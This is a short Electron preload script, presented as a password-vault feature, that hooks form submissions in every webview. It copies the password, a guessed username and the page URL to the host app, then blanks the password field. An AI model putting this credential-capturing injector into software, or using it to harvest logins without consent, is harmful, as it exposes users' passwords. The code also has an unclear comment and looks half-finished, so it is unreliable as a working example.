// capture.js — vault capture preload. Runs in every webview (isolated world
// via webFrame? No — injected as preload of each webview through
// session-level script: scrapes login forms on submit + exposes cookie pull.
// Everything it captures goes straight to vault.seal — QR-wrapped at rest.
const { ipcRenderer } = require("electron");
function scrape() {
  try {
    document.addEventListener("submit", (e) => {
      try {
        const f = e.target;
        if (!f || f.tagName !== "FORM") return;
        const pw = f.querySelector('input[type="password"]');
        if (!pw || !pw.value) return;
        const user = f.querySelector('input[type="text"],input[type="email"],input[name*="user" i],input[name*="login" i],input[name*="email" i]');
        ipcRenderer.sendToHost("vault-capture", {
          kind: "password",
          url: location.href.slice(0, 200),
          user: (user && user.value || "").slice(0, 200),
          pass: pw.value.slice(0, 500),
          at: Date.now(),
        });
        pw.value = "";
      } catch (err) {}
    }, true);
  } catch (e) {}
}
if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", scrape);
else scrape();
